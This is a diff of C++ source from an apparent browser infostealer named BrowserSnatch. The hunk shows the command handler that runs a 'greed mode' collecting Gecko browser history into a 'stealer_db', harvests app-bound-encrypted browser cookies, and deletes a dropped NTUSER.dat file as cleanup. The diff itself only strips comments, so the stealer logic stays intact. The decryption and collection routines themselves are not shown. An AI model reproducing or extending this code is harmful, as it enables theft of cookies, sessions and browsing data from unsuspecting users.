@@ -74,7 +74,7 @@ BOOL Visualizer::greed_mode(std::string converted_username, std::string stealer_
     if (!gecko_history_collector(converted_username, stealer_db))
         std::cout << "Gecko History Collector failed!" << std::endl;
 
-    // handles app-bound-decryption
+
     handler(14, "");
 
     if (std::filesystem::exists(stealer_db)) {
@@ -200,32 +200,32 @@ void Visualizer::handler(int option, std::string service_parameter)
     }
     else if (option == 13)
     {
-        //greed mode
+
         if (!greed_mode(converted_username, stealer_db))
             std::cerr << "BrowserSnatch executed with {greed mode}: failed\nPlease Recalibrate BrowserSnatch...\n\n" << std::endl;
     }
     else if (option == 14)
     {
-        //app-bound-decryption
+
         std::cout << "Target App-Bound-Encrypted Cookies..." << std::endl;
         if (!app_bound_browsers_cookie_collector(converted_username, stealer_db, false, ""))
             std::cerr << "BrowserSnatch executed with {app_bound_decryption mode}: failed\nPlease Recalibrate BrowserSnatch...\n\n" << std::endl;
 
-        // Pause before exit
+
         std::cout << "DB PATH: " << stealer_db << std::endl;
-        //std::cout << "\nPress any key to exit...";
-        //std::cin.get();
+
+
     }
     else if (option == 15)
     {
-        //app-bound-decryption
+
         if (!app_bound_browsers_cookie_collector(converted_username, stealer_db, true, service_parameter))
             std::cerr << "BrowserSnatch executed with {app_bound_decryption mode}: failed" << std::endl;
     }
     else if (option == 16)
     {
-        //recalibrating... cleanup service... deleting ntuser, masqueraded snatch browser binaries etc
-        //currently only ntuser
+
+
         std::string output_file = "c:\\users";
         output_file += "\\public\\";
         output_file += "NTUSER.dat";
@@ -238,7 +238,7 @@ void Visualizer::handler(int option, std::string service_parameter)
             }
         }
         catch (const std::filesystem::filesystem_error& e) {
-            
+
         }
     }
     else
